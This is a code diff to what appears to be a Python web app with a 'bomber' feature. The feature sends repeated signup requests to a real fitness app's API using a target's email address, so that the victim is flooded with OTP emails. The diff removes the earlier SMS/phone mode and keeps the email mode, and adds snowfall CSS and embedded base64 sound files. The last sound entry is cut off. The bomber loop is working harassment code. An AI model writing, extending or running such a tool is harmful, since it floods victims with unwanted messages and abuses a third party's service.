@@ -131,28 +131,17 @@ async def run_attack(phone, duration=None):
     add_attack_log("🛑 Attack terminated")
     attack_status["running"] = False
 
-# === BOMBER FUNCTION ===
-async def send_bomb_request(session, method, target, email=""):
+# === BOMBER FUNCTION (EMAIL ONLY) ===
+async def send_bomb_request(session, email):
     API_URL = "https://prod.fitflexapp.com/api/users/signupV1"
     
-    # For email method, use email as target
-    if method == "email":
-        payload = {
-            "type": "email",
-            "user_platform": "Android",
-            "country_id": "162",
-            "msisdn": "",
-            "email": target
-        }
-    else:
-        # Phone/SMS method
-        payload = {
-            "type": "msisdn",
-            "user_platform": "Android",
-            "country_id": "162",
-            "msisdn": target,
-            "email": ""
-        }
+    payload = {
+        "type": "email",
+        "user_platform": "Android",
+        "country_id": "162",
+        "msisdn": "",
+        "email": email
+    }
     
     try:
         async with session.post(API_URL, json=payload, timeout=10) as resp:
@@ -160,26 +149,26 @@ async def send_bomb_request(session, method, target, email=""):
     except:
         return False
 
-async def run_bomber(target, count, delay, method, email=""):
+async def run_bomber(email, count, delay):
     global bomb_status
     bomb_status["running"] = True
-    bomb_status["target"] = target
+    bomb_status["target"] = email
     bomb_status["total"] = count
     bomb_status["success"] = 0
     bomb_status["failed"] = 0
     bomb_status["progress"] = 0
-    bomb_status["method"] = method
-    bomb_status["email"] = email if method == "email" else None
+    bomb_status["method"] = "email"
+    bomb_status["email"] = email
     
-    method_name = "Email" if method == "email" else "SMS"
-    add_bomb_log(f"🚀 Bombing started on {target} ({method_name})")
+    add_bomb_log(f"🚀 Email bombing started on {email}")
     add_bomb_log(f"📊 Total: {count}, Delay: {delay}s")
+    add_bomb_log(f"📧 Check your email inbox and SPAM FOLDER for OTPs!")
 
     async with aiohttp.ClientSession() as session:
         for i in range(count):
             if not bomb_status["running"]:
                 break
-            ok = await send_bomb_request(session, method, target, email)
+            ok = await send_bomb_request(session, email)
             if ok:
                 bomb_status["success"] += 1
             else:
@@ -211,6 +200,7 @@ async def index():
             min-height: 100vh;
             color: #e2e8f0;
             overflow-x: hidden;
+            position: relative;
         }
         .pattern-bg {
             position: fixed;
@@ -253,6 +243,44 @@ async def index():
             0% { transform: translate(0, 0) scale(1); }
             100% { transform: translate(100px, -100px) scale(1.2); }
         }
+        
+        /* ===== SNOW/SPRINKLE EFFECT ===== */
+        .snow-container {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            z-index: 9998;
+            overflow: hidden;
+        }
+        .snowflake {
+            position: absolute;
+            top: -10px;
+            color: #ffffff;
+            font-size: 1.2rem;
+            animation: snowfall linear forwards;
+            opacity: 0.8;
+            text-shadow: 0 0 10px rgba(255,255,255,0.5), 0 0 20px rgba(59,130,246,0.3);
+        }
+        @keyframes snowfall {
+            0% {
+                transform: translateY(-10px) rotate(0deg) scale(0.5);
+                opacity: 0.9;
+            }
+            100% {
+                transform: translateY(110vh) rotate(720deg) scale(1.2);
+                opacity: 0.2;
+            }
+        }
+        .snowflake:nth-child(odd) {
+            animation-duration: 3s;
+        }
+        .snowflake:nth-child(even) {
+            animation-duration: 4s;
+        }
+        
         .glass-premium {
             background: rgba(10, 14, 26, 0.7);
             backdrop-filter: blur(20px);
@@ -681,6 +709,9 @@ async def index():
     <div class="orb" style="width:300px;height:300px;background:#8b5cf6;bottom:-50px;left:-50px;animation-delay:5s;"></div>
     <div class="orb" style="width:200px;height:200px;background:#06b6d4;top:50%;left:50%;transform:translate(-50%,-50%);animation-delay:8s;"></div>
 
+    <!-- Snow/Sprinkle Container -->
+    <div class="snow-container" id="snowContainer"></div>
+
     <!-- Enhanced Heart Overlay -->
     <div class="heart-overlay" id="heartOverlay">
         <div class="heart-container">
@@ -717,16 +748,16 @@ async def index():
     </div>
 
     <!-- Audio -->
+    <audio id="clickSound" preload="auto">
+        <source src="data:audio/wav;base64,UklGRlYDAABXQVZFZm10IBAAAAABAAEAQB8AAEAfAAABAAgAZGF0YQYDAACBhYqFh4qAgICAf4mMjo6LgH6Af3t/gHp3doR/gXx2e3Z1c2dxc3NwZWNfXmNcU1hVU1dWU1BQUU1MSkVGRkpHSEZGQ0dDQkI+OjUyMy4rKScnJiMiHRsWGRIPDAkGBwMCAQABAgIDAwMCAgEBAQEBAQEBAgIDAgIDAgIDAwMDAwMEBAQEBQUFBQUGBgYGBwcHCAgJCQkJCwsLCwsLCwwMDA0NDQ4ODg8PDw8PDw8PDw8PDw8PDw8QDw8PDw4ODg0NDQwMDAwLCwsKCgoICQgHBwYGBgUEBAMDAwICAQEBAQEBAQEBAQECAgIDAwMDAwQEBAUFBQYGBwcHCAgICQkJCgoLCwwMDA0ODQ4PDw8PDxAPEA8PDw8PDw8PDw8OEA8PDw4ODg4ODQ0NDQwMDAwLCwsLCgoKCQkJCQgHBwYGBgUFBAMDAwMCAgIBAQEBAQECAgIDAwMDAwQEBAUFBQYGBwcHCAgICQkJCgoLCwwMDA0ODQ4PDw8PDw8QDw8PDw8PDw8PDw4ODg4ODQ0NDQwMDAwLCwsLCgoJCQkICAcHBwYGBQUEBAMDAwMCAgEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBwcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PEA8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAA==">
+        </source>
+    </audio>
     <audio id="wrongSound" preload="auto">
-        <source src="data:audio/wav;base64,UklGRnoGAABXQVZFZm10IBAAAAABAAEAQB8AAEAfAAABAAgAZGF0YQoGAACBhYqFh4qAgICAf4mMjo6LgH6Af3t/gHp3doR/gXx2e3Z1c2dxc3NwZWNfXmNcU1hVU1dWU1BQUU1MSkVGRkpHSEZGQ0dDQkI+OjUyMy4rKScnJiMiHRsWGRIPDAkGBwMCAQABAgIDAwMCAgEBAQEBAQEBAgIDAgIDAgIDAwMDAwMEBAQEBQUFBQUGBgYGBwcHCAgJCQkJCwsLCwsLCwwMDA0NDQ4ODg8PDw8PDw8PDw8PDw8PDw8QDw8PDw4ODg0NDQwMDAwLCwsKCgoICQgHBwYGBgUEBAMDAwICAQEBAQEBAQEBAQECAgIDAwMDAwQEBAUFBQYGBwcHCAgICQkJCgoLCwwMDA0ODQ4PDw8PDxAPEA8PDw8PDw8PDw8OEA8PDw4ODg4ODQ0NDQwMDAwLCwsLCgoKCQkJCQgHBwYGBgUFBAMDAwMCAgIBAQEBAQECAgIDAwMDAwQEBAUFBQYGBwcHCAgICQkJCgoLCwwMDA0ODQ4PDw8PDw8QDw8PDw8PDw8PDw4ODg4ODQ0NDQwMDAwLCwsLCgoJCQkICAcHBwYGBQUEBAMDAwMCAgEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBwcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PEA8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAA==">
+        <source src="data:audio/wav;base64,UklGRnoGAABXQVZFZm10IBAAAAABAAEAQB8AAEAfAAABAAgAZGF0YQoGAACBhYqFh4qAgICAf4mMjo6LgH6Af3t/gHp3doR/gXx2e3Z1c2dxc3NwZWNfXmNcU1hVU1dWU1BQUU1MSkVGRkpHSEZGQ0dDQkI+OjUyMy4rKScnJiMiHRsWGRIPDAkGBwMCAQABAgIDAwMCAgEBAQEBAQEBAgIDAgIDAgIDAwMDAwMEBAQEBQUFBQUGBgYGBwcHCAgJCQkJCwsLCwsLCwwMDA0NDQ4ODg8PDw8PDw8PDw8PDw8PDw8QDw8PDw4ODg0NDQwMDAwLCwsKCgoICQgHBwYGBgUEBAMDAwICAQEBAQEBAQEBAQECAgIDAwMDAwQEBAUFBQYGBwcHCAgICQkJCgoLCwwMDA0ODQ4PDw8PDxAPEA8PDw8PDw8PDw8OEA8PDw4ODg4ODQ0NDQwMDAwLCwsLCgoKCQkJCQgHBwYGBgUFBAMDAwMCAgIBAQEBAQECAgIDAwMDAwQEBAUFBQYGBwcHCAgICQkJCgoLCwwMDA0ODQ4PDw8PDw8QDw8PDw8PDw8PDw4ODg4ODQ0NDQwMDAwLCwsLCgoJCQkICAcHBwYGBQUEBAMDAwMCAgEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBwcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PEA8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAA==">
         </source>
     </audio>
     <audio id="attackSound" preload="auto">
-        <source src="data:audio/wav;base64,UklGRnoGAABXQVZFZm10IBAAAAABAAEAQB8AAEAfAAABAAgAZGF0YQoGAACBhYqFh4qAgICAf4mMjo6LgH6Af3t/gHp3doR/gXx2e3Z1c2dxc3NwZWNfXmNcU1hVU1dWU1BQUU1MSkVGRkpHSEZGQ0dDQkI+OjUyMy4rKScnJiMiHRsWGRIPDAkGBwMCAQABAgIDAwMCAgEBAQEBAQEBAgIDAgIDAgIDAwMDAwMEBAQEBQUFBQUGBgYGBwcHCAgJCQkJCwsLCwsLCwwMDA0NDQ4ODg8PDw8PDw8PDw8PDw8PDw8QDw8PDw4ODg0NDQwMDAwLCwsKCgoICQgHBwYGBgUEBAMDAwICAQEBAQEBAQEBAQECAgIDAwMDAwQEBAUFBQYGBwcHCAgICQkJCgoLCwwMDA0ODQ4PDw8PDxAPEA8PDw8PDw8PDw8OEA8PDw4ODg4ODQ0NDQwMDAwLCwsLCgoKCQkJCQgHBwYGBgUFBAMDAwMCAgIBAQEBAQECAgIDAwMDAwQEBAUFBQYGBwcHCAgICQkJCgoLCwwMDA0ODQ4PDw8PDw8QDw8PDw8PDw8PDw4ODg4ODQ0NDQwMDAwLCwsLCgoJCQkICAcHBwYGBQUEBAMDAwMCAgEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBwcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PEA8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAA==">
-        </source>
-    </audio>
-    <audio id="niceSound" preload="auto">
-        <source src="data:audio/wav;base64,UklGRsYDAABXQVZFZm10IBAAAAABAAEAQB8AAEAfAAABAAgAZGF0YQYDAACBhYqFh4qAgICAf4mMjo6LgH6Af3t/gHp3doR/gXx2e3Z1c2dxc3NwZWNfXmNcU1hVU1dWU1BQUU1MSkVGRkpHSEZGQ0dDQkI+OjUyMy4rKScnJiMiHRsWGRIPDAkGBwMCAQABAgIDAwMCAgEBAQEBAQEBAgIDAgIDAgIDAwMDAwMEBAQEBQUFBQUGBgYGBwcHCAgJCQkJCwsLCwsLCwwMDA0NDQ4ODg8PDw8PDw8PDw8PDw8PDw8QDw8PDw4ODg0NDQwMDAwLCwsKCgoICQgHBwYGBgUEBAMDAwICAQEBAQEBAQEBAQECAgIDAwMDAwQEBAUFBQYGBwcHCAgICQkJCgoLCwwMDA0ODQ4PDw8PDxAPEA8PDw8PDw8PDw8OEA8PDw4ODg4ODQ0NDQwMDAwLCwsLCgoKCQkJCQgHBwYGBgUFBAMDAwMCAgIBAQEBAQECAgIDAwMDAwQEBAUFBQYGBwcHCAgICQkJCgoLCwwMDA0ODQ4PDw8PDw8QDw8PDw8PDw8PDw4ODg4ODQ0NDQwMDAwLCwsLCgoJCQkICAcHBwYGBQUEBAMDAwMCAgEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBwcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PEA8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAA==">
+        <source src="data:audio/wav;base64,UklGRnoGAABXQVZFZm10IBAAAAABAAEAQB8AAEAfAAABAAgAZGF0YQoGAACBhYqFh4qAgICAf4mMjo6LgH6Af3t/gHp3doR/gXx2e3Z1c2dxc3NwZWNfXmNcU1hVU1dWU1BQUU1MSkVGRkpHSEZGQ0dDQkI+OjUyMy4rKScnJiMiHRsWGRIPDAkGBwMCAQABAgIDAwMCAgEBAQEBAQEBAgIDAgIDAgIDAwMDAwMEBAQEBQUFBQUGBgYGBwcHCAgJCQkJCwsLCwsLCwwMDA0NDQ4ODg8PDw8PDw8PDw8PDw8PDw8QDw8PDw4ODg0NDQwMDAwLCwsKCgoICQgHBwYGBgUEBAMDAwICAQEBAQEBAQEBAQECAgIDAwMDAwQEBAUFBQYGBwcHCAgICQkJCgoLCwwMDA0ODQ4PDw8PDxAPEA8PDw8PDw8PDw8OEA8PDw4ODg4ODQ0NDQwMDAwLCwsLCgoKCQkJCQgHBwYGBgUFBAMDAwMCAgIBAQEBAQECAgIDAwMDAwQEBAUFBQYGBwcHCAgICQkJCgoLCwwMDA0ODQ4PDw8PDw8QDw8PDw8PDw8PDw4ODg4ODQ0NDQwMDAwLCwsLCgoJCQkICAcHBwYGBQUEBAMDAwMCAgEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBwcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PEA8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAg